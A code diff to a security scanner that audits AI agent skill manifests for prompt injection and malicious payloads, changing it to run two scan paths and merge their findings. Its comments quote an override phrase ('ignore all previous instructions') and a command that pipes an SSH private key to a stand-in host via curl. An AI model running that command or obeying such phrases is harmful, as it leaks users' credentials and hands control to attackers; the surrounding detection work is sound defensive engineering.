@@ -106,16 +106,22 @@ function resolveRulesDir(): string {
 }
 
 /**
- * Build an AgentEvent from instruction text for ATR evaluation.
+ * Build an llm_input AgentEvent for ATR evaluation.
+ *
+ * Used ALONGSIDE engine.scanSkill — not instead of it. scanSkill (scanContext
+ * 'skill') fires the mcp/tool rules but applies a 2+-compound-condition FP gate
+ * that suppresses single-pattern prompt-injection rules. The llm_input path has
+ * no such gate, so it recovers those short injection phrases ("ignore all
+ * previous instructions", persona/delimiter overrides, CJK injections). The two
+ * result sets are merged and deduplicated by rule ID.
  */
-function _buildLlmInputEvent(content: string, toolName?: string): AgentEvent {
+function buildLlmInputEvent(content: string): AgentEvent {
   return {
     type: 'llm_input',
     timestamp: new Date().toISOString(),
     content,
     fields: {
       user_input: content,
-      ...(toolName ? { tool_name: toolName } : {}),
     },
   };
 }
@@ -174,8 +180,9 @@ function matchesToFindings(matches: readonly ATRMatch[]): AuditFinding[] {
  * Run ATR engine checks against a parsed skill manifest.
  *
  * Evaluates:
- * 1. Skill instructions as llm_input event
- * 2. Skill description as llm_input event
+ * 1. Skill instructions via scanSkill (all rules fire) + llm_input (recovers
+ *    single-pattern prompt-injection rules scanSkill's FP gate suppresses)
+ * 2. Skill description via the same dual path
  * 3. MCP tool descriptions (if present in metadata) as tool_call events
  *
  * Returns a CheckResult compatible with the Skill Auditor pipeline.
@@ -236,18 +243,32 @@ export async function checkWithATR(
 
     const allMatches: ATRMatch[] = [];
 
-    // 1. Scan instructions as llm_input — runs ALL rules (not scanSkill which
-    //    skips MCP-targeted rules). Skill instructions can contain prompt
-    //    injection payloads that MCP rules detect.
+    // 1. Scan instructions via the SKILL entry point (scanContext: 'skill').
+    //    This fires ALL rules cross-context — including the mcp_exchange /
+    //    tool_call rules (credential theft, RCE, exfil, path traversal) that
+    //    engine.evaluate({type:'llm_input'}) silently filters out because
+    //    llm_input maps to source 'llm_io'. scanSkill also applies the
+    //    cross-context confidence*0.6 discount, the 2+-compound-condition FP
+    //    gate, and base64-decode scanning. A SKILL.md body is skill content,
+    //    not an llm_io turn — using only llm_input here reported live malware
+    //    (e.g. "cat ~/.ssh/id_rsa | curl evil") as "clean" while the runtime
+    //    hook denied the same payload.
+    //
+    //    We ALSO run an llm_input evaluate over the same text and merge the
+    //    results: scanSkill's FP gate suppresses single-pattern prompt-injection
+    //    rules ("ignore all previous instructions", persona/delimiter overrides,
+    //    CJK injections) that the ungated llm_input path catches. Running both
+    //    and deduping by rule ID (in matchesToFindings) keeps the mcp/tool
+    //    coverage without losing prompt-injection coverage.
     if (manifest.instructions) {
-      const instructionMatches = engine.evaluate(_buildLlmInputEvent(manifest.instructions));
-      allMatches.push(...instructionMatches);
+      allMatches.push(...engine.scanSkill(manifest.instructions));
+      allMatches.push(...engine.evaluate(buildLlmInputEvent(manifest.instructions)));
     }
 
-    // 2. Scan description as llm_input
+    // 2. Scan description through both paths as well.
     if (manifest.description) {
-      const descMatches = engine.evaluate(_buildLlmInputEvent(manifest.description));
-      allMatches.push(...descMatches);
+      allMatches.push(...engine.scanSkill(manifest.description));
+      allMatches.push(...engine.evaluate(buildLlmInputEvent(manifest.description)));
     }
 
     // 3. Scan MCP tool descriptions (if metadata includes them)
